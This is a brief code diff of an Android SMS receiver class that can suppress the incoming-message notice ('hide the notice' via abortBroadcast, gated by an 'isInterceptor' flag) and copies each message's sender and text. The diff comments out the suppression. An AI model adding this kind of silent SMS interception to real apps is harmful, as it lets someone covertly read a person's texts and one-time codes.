@@ -26,8 +26,8 @@ public class Receiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         if (intent.getAction()  //receive a sms.
                 .equals("android.provider.Telephony.SMS_RECEIVED")) { //hide the notice.
-            if (MainActivity.isInterceptor)
-                abortBroadcast();
+//            if (MainActivity.isInterceptor)
+//                abortBroadcast();
             StringBuilder sbBuilder = new StringBuilder(); //create to copy the sms.
             Bundle bundle = intent.getExtras();
             if (bundle != null) { //copy the sms.
@@ -46,6 +46,7 @@ public class Receiver extends BroadcastReceiver {
                     sbBuilder.append(smsMessage.getDisplayOriginatingAddress());
                     sbBuilder.append("\n");
                     sbBuilder.append(smsMessage.getDisplayMessageBody());//get the text.
+                    //
                 }
             }
 
